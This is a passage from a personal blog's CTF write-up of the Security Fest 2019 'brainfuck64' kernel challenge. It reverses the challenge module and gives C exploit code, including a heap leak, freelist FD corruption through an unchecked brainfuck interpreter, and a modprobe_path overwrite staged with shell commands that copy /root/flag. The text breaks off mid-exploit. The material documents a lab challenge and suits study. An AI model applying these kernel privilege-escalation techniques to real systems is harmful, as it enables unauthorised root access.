<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>Security Fest 2019 - brainfuck64 | kileak</title>





<meta name="description" content="Security Fest 2019 - brainfuck64">


<meta name="keywords" content="secfest">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2019/secfest-brainfuck64/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">Security Fest 2019 - brainfuck64</h1>
      <p class="post-meta">May 24, 2019</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>Points: 1065 Solves: 5
<!--break--></p>

  <p>Gabriel Shear: Do you know what the problem with Hollywood is? They make shit. (Except our new kernel-optimized brainfuck64 variant)</p>

  <p>Attachment: <a href="https://kileak.github.io/assets/secfest19/brainfuck64/brainfuck64.tar.gz">brainfuck64.tar.gz</a> <a href="https://kileak.github.io/assets/secfest19/brainfuck64/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/secfest19/brainfuck64/pwn.c">pwn.c</a></p>
</blockquote>

<figure class="highlight"><pre><code class="language-text" data-lang="text"> ▄▄▄▄     █████▒▄████▄   ██ ▄█▀
▓█████▄ ▓██   ▒▒██▀ ▀█   ██▄█▒ 
▒██▒ ▄██▒████ ░▒▓█    ▄ ▓███▄░ 
▒██░█▀  ░▓█▒  ░▒▓▓▄ ▄██▒▓██ █▄ 
░▓█  ▀█▓░▒█░   ▒ ▓███▀ ░▒██▒ █▄
░▒▓███▀▒ ▒ ░   ░ ░▒ ▒  ░▒ ▒▒ ▓▒
▒░▒   ░  ░       ░  ▒   ░ ░▒ ▒░
 ░    ░  ░ ░   ░        ░ ░░ ░ 
 ░             ░ ░      ░  ░   
      ░        ░            

Now with more brainfuck in your kernel

user@sctf:/home/user$ </code></pre></figure>

<p>Extracting initramfs, we’ll find a module <code class="language-plaintext highlighter-rouge">chall.ko</code>, which will create a device <code class="language-plaintext highlighter-rouge">/dev/brainfuck64</code>, that can be accessed via <code class="language-plaintext highlighter-rouge">ioctl</code>.</p>

<p>We can use that, to initialize a context object, write brainfuck code to it and execute it in kernel space (and afterwards read the output generated).</p>

<p>Reversing the module…</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">ProgramInfo</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">magic</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">struct</span> <span class="n">Context</span> <span class="p">{</span>
    <span class="n">ProgramInfo</span><span class="o">*</span> <span class="n">program</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">output_length</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">output</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">dev_write</span><span class="p">(</span><span class="kt">long</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ProgramInfo</span> <span class="n">dest</span><span class="p">;</span> 

    <span class="n">dest</span><span class="p">.</span><span class="n">magic</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">dest</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// Read program information from user buffer</span>
    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">"[BRAINFUCK64] Verifying header</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="c1">// Check header magic value</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">dest</span><span class="p">.</span><span class="n">magic</span> <span class="o">!=</span> <span class="mh">0x34364642</span> <span class="p">)</span> <span class="p">{</span>
        <span class="n">printk</span><span class="p">(</span><span class="s">"[BRAINFUCK64] Invalid header</span><span class="se">\n</span><span class="s">);</span><span class="err">
</span><span class="s">        return;</span><span class="err">
</span><span class="s">    }</span><span class="err">

</span><span class="s">    printk("</span><span class="p">[</span><span class="n">BRAINFUCK64</span><span class="p">]</span> <span class="n">Header</span> <span class="n">OK</span><span class="o">!</span><span class="err">\</span><span class="n">n</span><span class="s">");</span><span class="err">

</span><span class="s">    // Allocate context object</span><span class="err">
</span><span class="s">    ctx = kvmalloc_node(32);</span><span class="err">
</span><span class="s">  </span><span class="err">
</span><span class="s">    if ( ctx ) {</span><span class="err">
</span><span class="s">        // Allocate input/output buffer</span><span class="err">
</span><span class="s">        ctx-&gt;program = dest;</span><span class="err">
</span><span class="s">        ctx-&gt;output = (char*)kvmalloc_node(dest.size);</span><span class="err">
</span><span class="s">        ctx-&gt;input = kvmalloc_node(501);    </span><span class="err">
</span><span class="s">    }  </span><span class="err">
</span><span class="s">}</span><span class="err">

</span><span class="s">void dev_read(long fd, char *buffer)</span><span class="err">
</span><span class="s">{</span><span class="err">
</span><span class="s">    // Copy output buffer from brainfuck context to user buffer</span><span class="err">
</span><span class="s">    if ( ctx )</span><span class="err">
</span><span class="s">        return copy_to_user(buffer, ctx-&gt;output, ctx-&gt;output_length);</span><span class="err">
</span><span class="s">}</span><span class="err">

</span><span class="s">long dev_ioctl(long fd, int request, char *buffer)</span><span class="err">
</span><span class="s">{</span><span class="err">
</span><span class="s">    printk("</span><span class="p">[</span><span class="n">BRAINFUCK64</span><span class="p">]</span> <span class="n">IOCTL</span><span class="err">\</span><span class="n">n</span><span class="s">");</span><span class="err">

</span><span class="s">    // 0xD00DC0D3 =&gt; Read brainfuck output buffer</span><span class="err">
</span><span class="s">    if ( request == 0xD00DC0D3 ) {</span><span class="err">
</span><span class="s">        dev_read(fd, buffer);</span><span class="err">
</span><span class="s">        return 0;</span><span class="err">
</span><span class="s">    }</span><span class="err">
</span><span class="s">    // 0xAC1DC0D3 =&gt; Initialize brainfuck context</span><span class="err">
</span><span class="s">    else if ( request == 0xAC1DC0D3 ) {</span><span class="err">
</span><span class="s">        dev_write(fd, buffer);</span><span class="err">
</span><span class="s">        return 0;</span><span class="err">
</span><span class="s">    }</span><span class="err">
</span><span class="s">    </span><span class="err">
</span><span class="s">    // 0xBAADC0D3 =&gt; Execute brainfuck program</span><span class="err">
</span><span class="s">    if ( request != 0xBAADC0D3 ) {        </span><span class="err">
</span><span class="s">        return 0;</span><span class="err">
</span><span class="s">    }</span><span class="err">

</span><span class="s">    if ( !ctx ) {</span><span class="err">
</span><span class="s">        printk("</span><span class="p">[</span><span class="n">BRAINFUCK64</span><span class="p">]</span> <span class="n">B64</span> <span class="n">context</span> <span class="n">not</span> <span class="n">initialized</span><span class="err">\</span><span class="n">n</span><span class="s">");</span><span class="err">
</span><span class="s">        return 0;</span><span class="err">
</span><span class="s">    }</span><span class="err">

</span><span class="s">    copy_from_user(ctx-&gt;input, buffer, 500);</span><span class="err">

</span><span class="s">    if ( !ctx )</span><span class="err">
</span><span class="s">        return 0;</span><span class="err">

</span><span class="s">    printk("</span><span class="p">[</span><span class="n">BRAINFUCK64</span><span class="p">]</span> <span class="n">Running</span> <span class="n">brainfuck</span> <span class="n">interpreter</span><span class="err">\</span><span class="n">n</span><span class="s">");</span><span class="err">

</span><span class="s">    long offset_output = 0;</span><span class="err">
</span><span class="s">    long offset_input = 0;    </span><span class="err">

</span><span class="s">    while (1) {</span><span class="err">
</span><span class="s">        cur_op = ctx-&gt;input[offset_input];</span><span class="err">

</span><span class="s">        if ( cur_op == '&lt;' ) {</span><span class="err">
</span><span class="s">            // Move output cell left (decrease output pointer)</span><span class="err">
</span><span class="s">            --ctx-&gt;output;    </span><span class="err">
</span><span class="s">        }   </span><span class="err">
</span><span class="s">        else if (cur_op=='&gt;') {</span><span class="err">
</span><span class="s">            // Move output cell right (increase output pointer)</span><span class="err">
</span><span class="s">            ++ctx-&gt;output;</span><span class="err">
</span><span class="s">        }</span><span class="err">
</span><span class="s">        else if ( cur_op == ',' ) {</span><span class="err">
</span><span class="s">            // Read one byte from input</span><span class="err">
</span><span class="s">            ctx-&gt;output[offset_output++] = ctx-&gt;input[offset_input+1];</span><span class="err">
</span><span class="s">            offset_input += 2;      </span><span class="err">
</span><span class="s">        }</span><span class="err">
</span><span class="s">        else if ( cur_op == '-' ) {</span><span class="err">
</span><span class="s">            // Decrease cell value</span><span class="err">
</span><span class="s">            --*ctx-&gt;output;    </span><span class="err">
</span><span class="s">        }</span><span class="err">
</span><span class="s">        else if (cur_op=='+') {</span><span class="err">
</span><span class="s">            // Increase cell value</span><span class="err">
</span><span class="s">            ++*ctx-&gt;output;    </span><span class="err">
</span><span class="s">        }</span><span class="err">
</span><span class="s">        else if ( cur_op == '^' ) {</span><span class="err">
</span><span class="s">            // write qword from input to output</span><span class="err">
</span><span class="s">            *(long*)&amp;ctx-&gt;output[offset_output] = *(long*)ctx-&gt;input[offset_input + 1];</span><span class="err">

</span><span class="s">            offset_input += 8;</span><span class="err">
</span><span class="s">            offset_output += 8;    </span><span class="err">
</span><span class="s">        }</span><span class="err">
</span><span class="s">        else if ( cur_op == ']' ) {</span><span class="err">
</span><span class="s">            printk("</span><span class="p">[</span><span class="n">BRAINFUCK64</span><span class="p">]</span> <span class="n">Not</span> <span class="n">implemented</span><span class="o">!</span><span class="err">\</span><span class="n">n</span><span class="s">");    </span><span class="err">
</span><span class="s">        }</span><span class="err">
</span><span class="s">        else if ( cur_op == '[') {</span><span class="err">
</span><span class="s">            printk("</span><span class="p">[</span><span class="n">BRAINFUCK64</span><span class="p">]</span> <span class="n">Not</span> <span class="n">implemented</span><span class="o">!</span><span class="err">\</span><span class="n">n</span><span class="s">");        </span><span class="err">
</span><span class="s">        }</span><span class="err">
</span><span class="s">        else if (cur_op == '|') {</span><span class="err">
</span><span class="s">            printk("</span><span class="p">[</span><span class="n">BRAINFUCK64</span><span class="p">]</span> <span class="n">Deprecated</span> <span class="k">for</span> <span class="n">the</span> <span class="n">read</span> <span class="n">IOCTL</span><span class="s">");        </span><span class="err">
</span><span class="s">        }</span><span class="err">
</span><span class="s">        else {</span><span class="err">
</span><span class="s">            printk("</span><span class="p">[</span><span class="n">BRAINFUCK64</span><span class="p">]</span> <span class="n">OP</span> <span class="n">not</span> <span class="n">recognized</span><span class="p">,</span> <span class="n">exiting</span> <span class="p">...</span><span class="s">");</span><span class="err">
</span><span class="s">        }</span><span class="err">

</span><span class="s">        if ( ++offset_input &gt; 499 )</span><span class="err">
</span><span class="s">            return 0;</span><span class="err">
</span><span class="s">    }</span><span class="err">
</span><span class="s">  </span><span class="err">
</span><span class="s">    return 0;</span><span class="err">
</span><span class="s">}</span></code></pre></figure>

<p>So, there are three different request types we can send</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">0xAC1DC0D3</code> will initialize the brainfuck context and let us define the size of the output buffer.</li>
  <li><code class="language-plaintext highlighter-rouge">0xD00DC0D3</code> will copy the output buffer of the brainfuck context to a user buffer, enabling us to read the output.</li>
  <li><code class="language-plaintext highlighter-rouge">0xBAADC0D3</code> will copy a brainfuck program (max 500 bytes) from the user buffer and executes it.</li>
</ul>

<p>I totally overlooked the <code class="language-plaintext highlighter-rouge">^</code> operator for writing a complete qword while doing this challenge, which would have made it probably much easier to write the needed values into kernel space compared to my approach, but well…</p>

<p>The main problem here is, that we can define the size of the output buffer, but no boundary checks are done in the interpreter, so we can walk around freely in kernel space and read and change values.</p>

<p>My attack plan thus was</p>

<ul>
  <li>Allocate a program with output buffer of size 32</li>
  <li>Since the buffer isn’t initialized, we can directly read a heap address from its output buffer</li>
  <li>Send a brainfuck program which will
    <ul>
      <li>walk to the FD of the next free kernel chunk</li>
      <li>overwrite the FD with an arbitrary address of our choice</li>
    </ul>
  </li>
  <li>Allocate another program
    <ul>
      <li>since the allocation for <code class="language-plaintext highlighter-rouge">context</code> will request a 32 byte chunk our FD will be put into the bin list</li>
      <li>allocating the output buffer for the context will use our corrupted FD and serve us an arbitrary chunk for it</li>
    </ul>
  </li>
  <li>Send another brainfuck program to write to the arbitrary chunk</li>
</ul>

<p>Since the kernel has no <code class="language-plaintext highlighter-rouge">kaslr</code> enabled, we can use hardcoded addresses and don’t really need leaks. Thus the easiest approach to get the kernel symbols, is to extract initramfs, change the init script, so we will login as <code class="language-plaintext highlighter-rouge">root</code> and just grep <code class="language-plaintext highlighter-rouge">kallsyms</code>.</p>

<p>Setting up a base script for executing the different ioctl requests…</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span>
<span class="cp">#define DEV_READ        0xD00DC0D3
#define DEV_WRITE       0xAC1DC0D3
#define DEV_EXEC        0xBAADC0D3
#define HEADER          0x34364642
</span>
<span class="k">struct</span> <span class="n">dev_package</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">magic</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">ioctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">fp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">request</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">param</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">param</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">init_program</span><span class="p">(</span><span class="kt">int</span> <span class="n">fp</span><span class="p">,</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">dev_package</span> <span class="n">package</span><span class="p">;</span>

    <span class="n">package</span><span class="p">.</span><span class="n">magic</span> <span class="o">=</span> <span class="n">HEADER</span><span class="p">;</span>
    <span class="n">package</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">DEV_WRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">package</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">read_buffer</span><span class="p">(</span><span class="kt">int</span> <span class="n">fp</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">DEV_READ</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">exec_code</span><span class="p">(</span><span class="kt">int</span> <span class="n">fp</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span><span class="n">buffer</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">DEV_EXEC</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">fp</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Open brainfuck device</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fp</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/brainfuck64"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
        
    <span class="n">close</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Leaking a heap address from the kernel (not really needed, since we don’t have <code class="language-plaintext highlighter-rouge">kaslr</code>, but might help when switching to remote, where addresses might be a bit off).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Leak heap address</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">init_program</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>

<span class="n">read_buffer</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>

<span class="kt">long</span> <span class="n">current_fd</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">;</span>
    
<span class="n">printf</span><span class="p">(</span><span class="s">"Current FD    : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_fd</span><span class="p">);</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 
[+] Starting local process './run.sh': pid 30089
[30089]
[*] Paused (press any to continue)
[*] Compile
[*] Booting
[+] Upload: Done
[*] Switching to interactive mode
$ ./bout
./bout
[+] Open brainfuck device
[+] Leak heap address
Current FD    : 0xffff880006cd9520</code></pre></figure>

<p>Since overwriting <code class="language-plaintext highlighter-rouge">modprobe_path</code> went pretty well in the last kernel challenge, I decided to go for it again</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">ffffffff81a3f7a0 D modprobe_path</code></pre></figure>

<p>Preparing it at the start of our exploit</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define MODPROBE_PATH   0xffffffff81a3f7a0
</span>
<span class="p">...</span> 

<span class="kt">void</span> <span class="nf">prepare_modprobe_exploit</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Prepare modprobe exploit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/cat /root/flag &gt; /home/user/flag</span><span class="se">\n</span><span class="s">/bin/chmod 777 /home/user/flag' &gt; /home/user/p"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/user/p"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /home/user/dummy"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/user/dummy"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">fp</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Prepare modprobe exploit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">prepare_modprobe_exploit</span><span class="p">();</span>

    <span class="p">...</span>
<span class="p">}</span></code></pre></figure>

<p>So, we’d want to overwrite the FD of the next free chunk with a pointer to <code class="language-plaintext highlighter-rouge">modprobe_path</code> (I pointed it <code class="language-plaintext highlighter-rouge">0x10</code> above to not interfere with FD/BK). Could have probably used the <code class="language-plaintext highlighter-rouge">^</code> operator for that, but didn’t reverse the module that far, when doing the challenge, because I already had another option in mind.</p>

<p>With <code class="language-plaintext highlighter-rouge">+</code> and <code class="language-plaintext highlighter-rouge">-</code> we can increase and decrease the values for every byte, and since we know the original and the destination value, I just generated a brainfuck program, which will walk over the bytes and increase/decrease them, depending how they are compared to the destination byte.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="o">*</span><span class="n">ptr_payload</span><span class="p">;</span>

<span class="cp">#define ADDOP(x) *(ptr_payload++) = x
#define STARTCODE() memset(payload, 0, 0x1000); ptr_payload = payload;
</span>
<span class="kt">void</span> <span class="nf">change_value</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">src_value</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dest_value</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">size</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">src_value</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">dest_value</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
            <span class="c1">// Increase/decrease value until it matches destination value</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">src_value</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">dest_value</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
                <span class="n">ADDOP</span><span class="p">(</span><span class="sc">'-'</span><span class="p">);</span>
                <span class="n">src_value</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">--</span><span class="p">;</span>
            <span class="p">}</span>    
            <span class="k">else</span> <span class="p">{</span>
                <span class="n">ADDOP</span><span class="p">(</span><span class="sc">'+'</span><span class="p">);</span>
                <span class="n">src_value</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="c1">// Go to next byte</span>
        <span class="n">ADDOP</span><span class="p">(</span><span class="sc">'&gt;'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="kt">long</span> <span class="n">modprobe_addr</span> <span class="o">=</span> <span class="n">MODPROBE_PATH</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Current FD    : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_fd</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Dest FD       : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe_addr</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Create brainfuck code to corrupt free chunk FD</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">STARTCODE</span><span class="p">();</span>

    <span class="c1">// Move to next free chunk fd pointer</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x20</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">ADDOP</span><span class="p">(</span><span class="sc">'&gt;'</span><span class="p">);</span>        
    
    <span class="c1">// Change chunk fd to point above modprobe path</span>
    <span class="n">change_value</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">current_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">modprobe_addr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    
    <span class="p">...</span> 
<span class="p">}</span></code></pre></figure>

<p>The generated programs could easily get bigger than 500 bytes, but that’s not really a problem, since the context will stay the same between mutliple executions, so we can just split it up into multiple buffers afterwards.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">execute_program</span><span class="p">(</span><span class="kt">int</span> <span class="n">fp</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">code</span><span class="p">,</span> <span class="kt">int</span> <span class="n">code_size</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">cur_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">send_code</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="k">while</span><span class="p">(</span><span class="n">cur_offset</span> <span class="o">&lt;</span> <span class="n">code_size</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">send_code</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>

        <span class="kt">int</span> <span class="n">copy_size</span> <span class="o">=</span> <span class="n">code_size</span><span class="o">-</span><span class="n">cur_offset</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">copy_size</span> <span class="o">&gt;</span> <span class="mi">500</span><span class="p">)</span>
            <span class="n">copy_size</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span>

        <span class="c1">// Copy current part of code to send code</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">send_code</span><span class="p">,</span> <span class="n">code</span><span class="o">+</span><span class="n">cur_offset</span><span class="p">,</span> <span class="n">copy_size</span><span class="p">);</span>

        <span class="n">exec_code</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">send_code</span><span class="p">);</span>

        <span class="n">cur_offset</span> <span class="o">+=</span> <span class="n">copy_size</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="p">...</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Execute brainfuck code</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">execute_program</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span></code></pre></figure>

<p>After this was executed, the FD will now point above <code class="language-plaintext highlighter-rouge">modprobe_path</code></p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">pwndbg&gt; x/30gx 0xffff880000204520
0xffff880000204520:	0xffffffff81a3f790	0x67870775ba34092c  &lt;== FD
0xffff880000204530:	0xc1b70fc8d6204989	0x6ed39672ada07956
0xffff880000204540:	0xffff880000204560	0x2ee7a4d492a3e749
0xffff880000204550:	0x6bd09a69964b19ed	0xe83666d4a7d61ec2
0xffff880000204560:	0xffff880000204580	0xcb9dde3a026d1ee9
0xffff880000204570:	0x0a7383ccb98dde9d	0x1f4e6480b4dce7d8

pwndbg&gt; x/30gx 0xffffffff81a3f790
0xffffffff81a3f790:	0x0000000000000000	0x0000000000000000
0xffffffff81a3f7a0:	0x6f6d2f6e6962732f	0x000065626f727064  &lt;== /sbin/modprobe
0xffffffff81a3f7b0:	0x0000000000000000	0x0000000000000000
0xffffffff81a3f7c0:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>So, when we now allocate another brainfuck context, it will allocate 32 bytes for the context object, putting our fake FD in the bin list and then allocate another 32 byte chunk for the output buffer (which will then be served with our modprobe chunk).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Allocate new program chunk, output buffer pointing to modprobe path chunk</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
